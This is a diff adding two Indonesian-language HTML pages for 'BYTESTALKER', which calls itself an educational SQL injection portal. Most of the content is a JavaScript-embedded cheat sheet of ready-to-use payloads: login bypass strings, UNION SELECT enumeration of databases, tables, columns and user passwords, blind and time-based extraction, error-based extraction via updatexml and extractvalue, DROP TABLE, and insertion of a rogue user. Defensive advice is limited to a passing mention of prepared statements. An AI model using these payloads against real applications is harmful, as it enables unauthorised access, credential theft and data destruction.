@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>BYTESTALKER - Home</title>
+  <style>
+    body {
+      background-color: black;
+      color: #00ffcc;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 100px;
+    }
+    a.button {
+      display: inline-block;
+      padding: 12px 20px;
+      margin-top: 20px;
+      background-color: #00ffcc;
+      color: black;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+    a.button:hover {
+      background-color: #008877;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to <span style="color: lime;">BYTESTALKER</span></h1>
+  <p>Portal pengetahuan sql injection edukasi siber</p>
+
+  <a href="tools.html" class="button">🔧 Lihat pengetahuan Sql injection BYTESTALKER</a>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>BYTESTALKER - Pengetahuan SQL Lengkap</title>
+  <style>
+    body {
+      background-color: #000000;
+      color: #00ffcc;
+      font-family: monospace;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    button {
+      background-color: #00ffcc;
+      color: black;
+      border: none;
+      padding: 10px 18px;
+      margin: 10px 5px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      font-family: monospace;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #008877;
+    }
+    #penjelasan {
+      max-width: 700px;
+      margin: 20px auto;
+      background: #003333;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: left;
+      font-size: 16px;
+      line-height: 1.6;
+      display: none;
+      white-space: pre-wrap;
+    }
+    code {
+      background: #004d4d;
+      padding: 3px 6px;
+      border-radius: 4px;
+      color: #00ffcc;
+      font-weight: bold;
+      font-family: monospace;
+      display: block;
+      margin: 8px 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>🧠 Pengetahuan SQL BYTESTALKER</h1>
+  <p>Klik tombol di bawah untuk melihat penjelasan dan contoh payload SQL Injection yang lebih lengkap:</p>
+
+  <div>
+    <button onclick="showPenjelasan('sqlInjection')">Apa itu SQL Injection?</button>
+    <button onclick="showPenjelasan('queryRentan')">Contoh Query Rentan</button>
+    <button onclick="showPenjelasan('payloadDasar')">Payload Dasar SQL Injection</button>
+    <button onclick="showPenjelasan('payloadBypass')">Payload Bypass Login</button>
+    <button onclick="showPenjelasan('payloadUnion')">Payload UNION SELECT Lengkap</button>
+    <button onclick="showPenjelasan('payloadBlind')">Payload Blind SQL Injection</button>
+    <button onclick="showPenjelasan('payloadErrorBased')">Payload Error-Based SQL Injection</button>
+  </div>
+
+  <div id="penjelasan"></div>
+
+  <script>
+    const penjelasanData = {
+      sqlInjection: `Apa itu SQL Injection?
+
+SQL Injection adalah teknik serangan keamanan yang mengeksploitasi kerentanan pada aplikasi yang menggunakan database SQL. Penyerang memasukkan kode SQL berbahaya ke dalam input aplikasi untuk mengubah jalannya query, sehingga bisa membaca, mengubah, atau menghapus data secara ilegal.`,
+
+      queryRentan: `Contoh Query Rentan:
+
+SELECT * FROM users WHERE username = '<input_user>' AND password = '<input_pass>';
+
+Query ini rentan karena input langsung disisipkan tanpa validasi atau prepared statements. Penyerang bisa menyisipkan kode SQL berbahaya di input_user atau input_pass.`,
+
+      payloadDasar: `Payload Dasar SQL Injection:
+
+1. Bypass Login dengan Kondisi Selalu Benar
+
+' OR '1'='1'; --
+
+Penjelasan:
+Payload ini menutup string input, lalu menambahkan kondisi yang selalu benar (1=1), sehingga query WHERE menjadi selalu true. Bagian -- mengabaikan sisa query.
+
+Contoh query rentan:
+
+SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '';
+
+Karena kondisi selalu true, login bisa dilewati.
+
+---
+
+2. Komentar SQL untuk Mengabaikan Sisa Query
+
+' -- 
+' #
+
+Penjelasan:
+Digunakan untuk mengomentari bagian query yang tidak ingin dijalankan, misal password atau kondisi lain, supaya fokus payload berhasil.
+
+---
+
+3. UNION SELECT untuk Menggabungkan Data
+
+' UNION SELECT 1,2,3; --
+
+Penjelasan:
+Digunakan untuk mengambil data dari tabel lain dengan menggabungkan hasil query asli dengan query payload. Jumlah kolom pada SELECT harus sama.
+
+---
+
+4. Mendapatkan Nama Database
+
+' UNION SELECT null, database(); --
+
+---
+
+5. Mendapatkan Daftar Tabel
+
+' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database(); --
+
+---
+
+6. Mendapatkan Daftar Kolom dari Tabel Tertentu
+
+' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'; --
+
+---
+
+7. Blind SQL Injection - Tes Kondisi TRUE/FALSE
+
+' AND 1=1; --
+' AND 1=2; --
+
+---
+
+8. Blind SQL Injection - Ekstrak Data Karakter per Karakter
+
+' AND ASCII(SUBSTRING((SELECT database()),1,1))=100; --
+
+---
+
+9. Error-Based SQL Injection untuk Mendapatkan Data dari Error Message
+
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a); --
+
+---
+
+10. Payload untuk Menghapus Tabel (Berbahaya, Hanya Edukasi!)
+
+'; DROP TABLE users; --
+
+---
+
+11. Payload untuk Menambahkan User Baru (Update Database)
+
+'; INSERT INTO users(username, password) VALUES('hacker', 'pass123'); --
+
+---
+
+12. Payload untuk Membaca Data Sensitif
+
+' UNION SELECT username, password FROM users; --`,
+
+      payloadBypass: `Payload Bypass Login Lengkap:
+
+' OR '1'='1'; --
+' OR 1=1 -- 
+" OR "1"="1" -- 
+admin' -- 
+admin' # 
+admin'/* 
+' OR 'x'='x'; -- 
+' OR 1=1 LIMIT 1; --
+
+Catatan:
+- Menyisipkan kondisi selalu benar ke dalam query login.
+- Menggunakan komentar SQL untuk mengabaikan sisa perintah.
+- Efektif bila tidak ada sanitasi atau prepared statement.`,
+
+      payloadUnion: `Payload UNION SELECT Lengkap:
+
+' UNION SELECT null, null; -- 
+' UNION SELECT 1, 'test'; -- 
+' UNION SELECT database(), version(); -- 
+' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database(); -- 
+' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users'; -- 
+' UNION SELECT username, password FROM users; --
+
+Catatan:
+- Pastikan jumlah kolom SELECT sama.
+- null bisa digunakan sebagai pengisi placeholder.`,
+
+      payloadBlind: `Payload Blind SQL Injection Lengkap:
+
+' AND 1=1; --   -- TRUE
+' AND 1=2; --   -- FALSE
+
+-- Cek huruf pertama nama database:
+' AND ASCII(SUBSTRING((SELECT database()),1,1)) = 100; --
+
+-- Cek huruf pertama user:
+' AND ASCII(SUBSTRING((SELECT user()),1,1)) = 114; --
+
+-- Delay-based (MySQL):
+' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=100, SLEEP(5), 0); --
+
+Catatan:
+- Cocok untuk sistem yang tidak menampilkan error tapi bisa dibandingkan respon.`,
+
+      payloadErrorBased: `Payload Error-Based SQL Injection Lengkap:
+
+-- Memaksa error menampilkan data:
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a); --
+
+-- Menggunakan updatexml:
+' AND updatexml(null, concat(0x3a,(SELECT database())), null); --
+
+-- Menggunakan extractvalue:
+' AND extractvalue(1, concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))); --
+
+Catatan:
+- Perlu error message terlihat agar berhasil.
+- Umumnya pada MySQL yang tidak mematikan error output.`
+    };
+
+    function showPenjelasan(key) {
+      const container = document.getElementById('penjelasan');
+      if (container.innerHTML === penjelasanData[key]) {
+        container.style.display = 'none';
+        container.innerHTML = '';
+      } else {
+        container.innerHTML = penjelasanData[key];
+        container.style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
